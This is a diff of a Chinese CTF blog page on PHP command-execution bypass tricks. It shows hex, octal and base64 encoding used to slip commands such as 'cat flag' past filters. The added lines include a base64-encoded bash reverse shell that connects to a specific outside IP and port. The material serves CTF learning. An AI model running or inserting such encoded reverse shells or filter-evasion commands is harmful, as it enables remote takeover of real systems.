@@ -24,7 +24,7 @@
 <meta property="og:description" content="命令执行基础知识php命令执行函数12345678system()passthru()exec()shell_exec()popen()proc_open()pcntl_exec()反引号&#96;&#96; 同shell_exec()   管道符与元字符1234567891011121314151617181920212223CR：回车键&lt;ennter&gt;&#x3D;：设定变量$：作变量或运算替换&gt;：重定">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-09-12T13:02:48.000Z">
-<meta property="article:modified_time" content="2023-01-19T03:21:42.494Z">
+<meta property="article:modified_time" content="2023-02-01T02:52:57.639Z">
 <meta property="article:author" content="springtime">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="php">
@@ -221,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          19k words
+          20k words
         
       </span>
     
@@ -232,7 +232,7 @@
         
         
         
-          162 mins
+          164 mins
         
       </span>
     
@@ -310,7 +310,7 @@
 <h2 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h2><h3 id="1-bash进制转换、编码"><a href="#1-bash进制转换、编码" class="headerlink" title="1.bash进制转换、编码"></a>1.bash进制转换、编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">//16进制编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span>&#124;xxd -p   <span class="hljs-comment"># encode</span><br>63617420666c61670a<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61670a&quot;</span>&#124;xxd -r -p   <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>//8进制执行<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)  <span class="hljs-comment">#ls</span><br><br>//base64编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span> &#124; <span class="hljs-built_in">base64</span>  <span class="hljs-comment"># encode</span><br>Y2F0IGZsYWcK<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcK&quot;</span> &#124; <span class="hljs-built_in">base64</span> -d  <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0Cg==&#x27;</span> &#124; <span class="hljs-built_in">base64</span> -d` flag.txt     <span class="hljs-comment"># &quot;Y2F0Cg==&quot; 解码后是cat</span><br><br></code></pre></td></tr></table></figure>
 
 <p>如果加上直接执行的话就是</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">16进制：echo <span class="hljs-variable">&lt;hexString&gt;</span>&#124;<span class="hljs-string">xxd -r -p</span>&#124;bash<br>base64：echo <span class="hljs-variable">&lt;base64String&gt;</span>&#124;<span class="hljs-string">base64 -d</span>&#124;bash<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#16进制</span><br><span class="hljs-built_in">echo</span> &lt;hexString&gt;&#124;xxd -r -p&#124;bash<br><span class="hljs-comment">#base64</span><br><span class="hljs-built_in">echo</span> &lt;base64String&gt;&#124;<span class="hljs-built_in">base64</span> -d&#124;bash<br><span class="hljs-comment">#base64反弹shell: bash -i &gt;&amp; /dev/tcp/101.33.203.2/4444 0&gt;&amp;1</span><br>bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzMuMjAzLjIvNDQ0NCAwPiYx&#125;&#124;&#123;<span class="hljs-built_in">base64</span>,-d&#125;&#124;&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure>
 
 
 
